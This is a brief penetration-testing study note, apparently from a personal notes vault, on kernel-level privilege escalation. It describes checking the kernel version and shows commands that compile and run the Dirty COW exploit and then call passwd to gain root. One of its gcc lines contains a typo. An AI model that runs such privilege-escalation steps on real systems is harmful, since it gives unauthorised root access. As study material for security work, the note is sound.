Kernel level exploit, exploits against the OS and it's logic. 
#### Enum
You are looking for kernel version on the target system to see what you can exploit. 
![[System#^c36ae3]]
#### Exploitation
This section is more specific to the exploit you find. Each will be different and its own way of exploiting it. So mileage varies depending on the vulnerability. Usually with kernel level exploits, they will be written in C and will require you to compile the exploit and run it on the target. This is also liable to break the system or make it unstable so probably something you note but don't use unless you have no other option. 
##### Dirty Cow Example
```bash
# Get the exploit C code from searchsploit, exploitdb, google, etc
gcc -pthread <dirty cow src>.c -o <outputfile>
gcc pthread c0w.c -o cow
./cow
# Should say: Backing up /usr/bin/passwd to /tmp/bak
# so, it's replacing the passwd binary with a privesc, so run passwd
passwd

# any you should now have root.
```
